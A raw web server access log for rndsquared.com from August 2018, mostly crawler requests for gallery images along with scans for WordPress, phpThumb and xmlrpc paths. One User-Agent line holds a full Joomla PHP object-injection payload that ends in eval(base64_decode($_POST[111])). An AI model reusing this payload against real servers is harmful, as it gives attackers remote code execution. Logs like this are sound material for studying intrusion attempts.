40.77.194.122 - - [01/Aug/2018:08:53:41 -0700] "GET /img/bs4w/thumbs/2.jpg HTTP/1.1" 200 31891 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:41 -0700] "GET /img/bs4w/thumbs/5.jpg HTTP/1.1" 200 12034 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:41 -0700] "GET /img/bs4w/thumbs/4.jpg HTTP/1.1" 200 27608 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:41 -0700] "GET /img/bs4w/thumbs/7.jpg HTTP/1.1" 200 23328 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:41 -0700] "GET /img/bs4w/thumbs/6.jpg HTTP/1.1" 200 12384 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:41 -0700] "GET /img/bs4w/thumbs/8.jpg HTTP/1.1" 200 22657 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:41 -0700] "GET /img/sfnoir/thumbs/1.jpg HTTP/1.1" 200 25215 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/sfnoir/thumbs/3.jpg HTTP/1.1" 200 22380 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/sfnoir/thumbs/5.jpg HTTP/1.1" 200 18532 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/sfnoir/thumbs/6.jpg HTTP/1.1" 200 31401 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/sfnoir/thumbs/7.jpg HTTP/1.1" 200 33692 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/sfnoir/thumbs/8.jpg HTTP/1.1" 200 32404 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/sfnoir/thumbs/9.jpg HTTP/1.1" 200 20844 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/njn/thumbs/2.jpg HTTP/1.1" 200 26672 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/njn/thumbs/3.jpg HTTP/1.1" 200 33267 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/njn/thumbs/4.jpg HTTP/1.1" 200 32206 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/njn/thumbs/5.jpg HTTP/1.1" 200 27963 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/njn/thumbs/6.jpg HTTP/1.1" 200 32048 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/njn/thumbs/7.jpg HTTP/1.1" 200 28520 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/autumn/thumbs/2.jpg HTTP/1.1" 200 45196 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/njn/thumbs/8.jpg HTTP/1.1" 200 28396 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:42 -0700] "GET /img/autumn/thumbs/3.jpg HTTP/1.1" 200 40589 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:43 -0700] "GET /img/autumn/thumbs/4.jpg HTTP/1.1" 200 20880 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:43 -0700] "GET /img/autumn/thumbs/5.jpg HTTP/1.1" 200 29246 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:43 -0700] "GET /img/autumn/thumbs/6.jpg HTTP/1.1" 200 30923 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:43 -0700] "GET /img/autumn/thumbs/7.jpg HTTP/1.1" 200 25117 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:43 -0700] "GET /img/autumn/thumbs/8.jpg HTTP/1.1" 200 20283 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:43 -0700] "GET /img/logo.png HTTP/1.1" 200 13123 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.194.122 - - [01/Aug/2018:08:53:43 -0700] "GET /img/marble.jpg HTTP/1.1" 200 292701 "http://rndsquared.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
35.204.113.178 - - [01/Aug/2018:09:00:47 -0700] "GET /img/njn/thumbs/7.jpg HTTP/1.1" 200 28520 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.113.178 - - [01/Aug/2018:09:15:45 -0700] "GET /img/mixman/thumbs/10.jpg HTTP/1.1" 200 31032 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
176.10.99.200 - - [01/Aug/2018:09:30:16 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
35.204.177.243 - - [01/Aug/2018:09:39:05 -0700] "GET /img/oncekids-fujimini/2.jpg HTTP/1.1" 200 99983 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
77.75.76.169 - - [01/Aug/2018:09:39:24 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.76.169 - - [01/Aug/2018:09:39:32 -0700] "GET /img/mixman/thumbs/9.jpg HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
35.204.177.243 - - [01/Aug/2018:09:48:27 -0700] "GET /img/sfnoir/6.jpg HTTP/1.1" 200 112789 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
54.36.148.37 - - [01/Aug/2018:09:59:55 -0700] "GET /img/njn/5.jpg HTTP/1.1" 200 117364 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
35.204.158.196 - - [01/Aug/2018:10:18:40 -0700] "GET /img/oncekids-fujimini/thumbs/6.jpg HTTP/1.1" 200 27603 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.79.218 - - [01/Aug/2018:10:28:44 -0700] "GET /img/mixman/thumbs/9.jpg HTTP/1.1" 200 34012 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
66.249.66.42 - - [01/Aug/2018:10:37:35 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.44 - - [01/Aug/2018:10:37:35 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.204.25.187 - - [01/Aug/2018:11:17:47 -0700] "GET /img/autumn/thumbs/6.jpg HTTP/1.1" 200 30923 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.79.218 - - [01/Aug/2018:11:36:47 -0700] "GET /img/njn/8.jpg HTTP/1.1" 200 124240 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.125.222 - - [01/Aug/2018:11:38:57 -0700] "GET /img/wu-wei/8.jpg HTTP/1.1" 200 457546 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.79.218 - - [01/Aug/2018:11:54:21 -0700] "GET /img/njn/2.jpg HTTP/1.1" 200 103550 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
66.249.66.46 - - [01/Aug/2018:12:34:13 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.204.158.196 - - [01/Aug/2018:12:36:41 -0700] "GET /img/urban-cowgirl/thumbs/5.jpg HTTP/1.1" 200 26913 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
66.249.66.44 - - [01/Aug/2018:12:40:48 -0700] "GET /css/styles.css HTTP/1.1" 200 1975 "http://rndsquared.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
73.231.164.56 - - [01/Aug/2018:13:11:21 -0700] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPad; CPU OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/12.2b11231 Mobile/15G77 Safari/605.1.15"
35.204.18.234 - - [01/Aug/2018:13:41:43 -0700] "GET /img/autumn/1.jpg HTTP/1.1" 200 290161 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.25.187 - - [01/Aug/2018:14:17:13 -0700] "GET /img/wu-wei/3.jpg HTTP/1.1" 200 173337 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.190.53 - - [01/Aug/2018:14:57:49 -0700] "GET /img/urban-cowgirl/6.jpg HTTP/1.1" 200 56465 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.158.196 - - [01/Aug/2018:15:37:57 -0700] "GET /img/sfnoir/1.jpg HTTP/1.1" 200 77798 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.25.187 - - [01/Aug/2018:15:38:19 -0700] "GET /img/njn/thumbs/5.jpg HTTP/1.1" 200 27963 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.158.196 - - [01/Aug/2018:15:51:24 -0700] "GET /img/mixman/17.jpg HTTP/1.1" 200 60460 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.175.17 - - [01/Aug/2018:15:56:27 -0700] "GET /img/njn/7.jpg HTTP/1.1" 200 116420 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
37.115.185.236 - - [01/Aug/2018:15:58:27 -0700] "GET / HTTP/1.1" 200 72658 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
37.115.185.236 - - [01/Aug/2018:15:58:28 -0700] "POST /connectors/system/phpthumb.php HTTP/1.1" 404 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
37.115.185.236 - - [01/Aug/2018:15:58:28 -0700] "GET /dbs.php HTTP/1.1" 404 205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
35.204.175.17 - - [01/Aug/2018:16:07:23 -0700] "GET /img/mixman/16.jpg HTTP/1.1" 200 113328 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.113.178 - - [01/Aug/2018:16:17:31 -0700] "GET /img/mixman/6.jpg HTTP/1.1" 200 105501 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
192.99.9.147 - - [01/Aug/2018:16:35:43 -0700] "GET /connectors/system/phpthumb.php HTTP/1.0" 404 228 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
192.99.9.147 - - [01/Aug/2018:16:35:45 -0700] "GET /connectors/system/phpthumb.php HTTP/1.0" 404 228 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
80.82.70.116 - - [01/Aug/2018:16:36:01 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
123.57.254.142 - - [01/Aug/2018:17:00:34 -0700] "POST /blog/xmlrpc.php HTTP/1.1" 404 213 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
123.57.254.142 - - [01/Aug/2018:17:00:35 -0700] "POST /xmlrpc.php HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
52.53.201.78 - - [01/Aug/2018:17:15:14 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
35.204.177.243 - - [01/Aug/2018:17:21:23 -0700] "GET /img/sfnoir/thumbs/9.jpg HTTP/1.1" 200 20844 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.18.234 - - [01/Aug/2018:17:29:54 -0700] "GET /img/wu-wei/thumbs/5.jpg HTTP/1.1" 200 22671 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.113.178 - - [01/Aug/2018:18:34:27 -0700] "GET /img/wu-wei/9.jpg HTTP/1.1" 200 398953 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
54.36.148.168 - - [01/Aug/2018:18:50:42 -0700] "GET /img/autumn/1.jpg HTTP/1.1" 200 290161 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
185.234.217.34 - - [01/Aug/2018:18:54:48 -0700] "GET / HTTP/1.1" 200 72658 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
185.234.217.34 - - [01/Aug/2018:18:54:55 -0700] "GET / HTTP/1.1" 200 72658 "-" "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:54:\"eval(base64_decode($_POST[111]));JFactory::get();exit;\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}\xf0\x9d\x8c\x86"
185.234.217.34 - - [01/Aug/2018:18:55:02 -0700] "POST / HTTP/1.1" 200 72658 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
185.234.217.34 - - [01/Aug/2018:18:55:04 -0700] "GET /libraries/sfn.php HTTP/1.1" 404 215 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
139.81.234.138 - - [01/Aug/2018:19:16:04 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
35.204.79.218 - - [01/Aug/2018:19:25:17 -0700] "GET /img/wu-wei/thumbs/8.jpg HTTP/1.1" 200 26727 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
54.36.148.219 - - [01/Aug/2018:19:45:23 -0700] "GET /img/autumn/4.jpg HTTP/1.1" 200 166546 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
46.229.168.74 - - [01/Aug/2018:19:47:01 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
46.229.168.78 - - [01/Aug/2018:19:47:09 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
35.204.79.218 - - [01/Aug/2018:20:40:38 -0700] "GET /img/mixman/5.jpg HTTP/1.1" 200 86490 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
69.12.66.247 - - [01/Aug/2018:20:57:22 -0700] "GET /manager/index.php HTTP/1.1" 404 215 "http://www.rndsquared.com/manager/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
35.204.113.178 - - [01/Aug/2018:21:36:45 -0700] "GET /img/urban-cowgirl/thumbs/1.jpg HTTP/1.1" 200 26624 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.175.17 - - [01/Aug/2018:21:37:44 -0700] "GET /img/wu-wei/7.jpg HTTP/1.1" 200 293352 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.25.187 - - [01/Aug/2018:22:08:02 -0700] "GET /img/mixman/thumbs/3.jpg HTTP/1.1" 200 32138 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.125.222 - - [01/Aug/2018:22:26:11 -0700] "GET /img/mixman/10.jpg HTTP/1.1" 200 114974 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
73.231.164.56 - - [01/Aug/2018:22:45:00 -0700] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPad; CPU OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/12.2b11231 Mobile/15G77 Safari/605.1.15"
185.98.7.102 - - [01/Aug/2018:22:54:11 -0700] "GET //wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
185.98.7.102 - - [01/Aug/2018:22:54:12 -0700] "GET /blog//wp-login.php HTTP/1.1" 404 216 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
185.98.7.102 - - [01/Aug/2018:22:54:12 -0700] "GET /wordpress//wp-login.php HTTP/1.1" 404 221 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
185.98.7.102 - - [01/Aug/2018:22:54:13 -0700] "GET /wp//wp-login.php HTTP/1.1" 404 214 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
35.204.125.222 - - [01/Aug/2018:23:18:26 -0700] "GET /img/urban-cowgirl/thumbs/4.jpg HTTP/1.1" 200 27112 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.79.218 - - [01/Aug/2018:23:43:27 -0700] "GET /img/autumn/thumbs/3.jpg HTTP/1.1" 200 40589 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
73.231.164.56 - - [01/Aug/2018:23:58:53 -0700] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPad; CPU OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/12.2b11231 Mobile/15G77 Safari/605.1.15"
35.204.130.193 - - [02/Aug/2018:00:42:56 -0700] "GET /img/sfnoir/5.jpg HTTP/1.1" 200 67390 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.25.187 - - [02/Aug/2018:00:53:54 -0700] "GET /img/sfnoir/thumbs/7.jpg HTTP/1.1" 200 33692 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
180.76.15.145 - - [02/Aug/2018:01:00:20 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
35.204.158.196 - - [02/Aug/2018:01:20:02 -0700] "GET /img/sfnoir/thumbs/2.jpg HTTP/1.1" 200 23061 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
162.210.196.129 - - [02/Aug/2018:01:27:54 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
162.210.196.129 - - [02/Aug/2018:01:28:03 -0700] "GET / HTTP/1.1" 200 72658 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
35.204.130.193 - - [02/Aug/2018:01:30:38 -0700] "GET /img/wu-wei/thumbs/3.jpg HTTP/1.1" 200 22711 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
54.36.150.81 - - [02/Aug/2018:01:48:14 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
66.249.66.44 - - [02/Aug/2018:02:55:40 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.46 - - [02/Aug/2018:02:55:40 -0700] "GET /img/urban-cowgirl/2.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
5.248.253.117 - - [02/Aug/2018:04:14:21 -0700] "GET / HTTP/1.1" 200 72658 "https://russian-translator.com/localization-services" "Mozilla/4.79 [en] (Windows NT 5.0; U)"
5.248.253.117 - - [02/Aug/2018:04:14:22 -0700] "GET / HTTP/1.1" 200 72658 "https://russian-translator.com/localization-services" "Mozilla/4.79 [en] (Windows NT 5.0; U)"
5.248.253.117 - - [02/Aug/2018:04:14:23 -0700] "GET / HTTP/1.1" 200 72658 "https://russian-translator.com/localization-services" "Mozilla/4.79 [en] (Windows NT 5.0; U)"
66.249.66.42 - - [02/Aug/2018:04:26:50 -0700] "GET /img/sfnoir/thumbs/5.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
180.76.15.163 - - [02/Aug/2018:04:41:32 -0700] "GET /js/modernizr.js HTTP/1.1" 200 5933 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
35.204.92.146 - - [02/Aug/2018:05:08:39 -0700] "GET /img/wu-wei/thumbs/10.jpg HTTP/1.1" 200 20185 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.54.232 - - [02/Aug/2018:05:39:02 -0700] "GET /img/bs4w/thumbs/3.jpg HTTP/1.1" 200 21431 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.54.232 - - [02/Aug/2018:05:44:53 -0700] "GET /img/wu-wei/thumbs/2.jpg HTTP/1.1" 200 21193 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.85.149 - - [02/Aug/2018:06:01:00 -0700] "GET /img/bs4w/thumbs/8.jpg HTTP/1.1" 200 22657 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.54.232 - - [02/Aug/2018:06:18:37 -0700] "GET /img/urban-cowgirl/4.jpg HTTP/1.1" 200 103819 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.165.210 - - [02/Aug/2018:06:39:03 -0700] "GET /img/bs4w/3.jpg HTTP/1.1" 200 74030 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
180.76.15.147 - - [02/Aug/2018:06:52:29 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.158 - - [02/Aug/2018:06:52:29 -0700] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.24 - - [02/Aug/2018:06:55:24 -0700] "GET / HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
35.204.92.146 - - [02/Aug/2018:07:27:52 -0700] "GET /img/bs4w/8.jpg HTTP/1.1" 200 67708 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.42.215 - - [02/Aug/2018:07:38:45 -0700] "GET /img/urban-cowgirl/2.jpg HTTP/1.1" 200 104975 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
35.204.253.228 - - [02/Aug/2018:07:42:37 -0700] "GET /img/sfnoir/thumbs/8.jpg HTTP/1.1" 200 32404 "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)"
54.36.148.102 - - [02/Aug/2018:08:24:48 -0700] "GET /img/njn/4.jpg HTTP/1.1" 200 151484 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
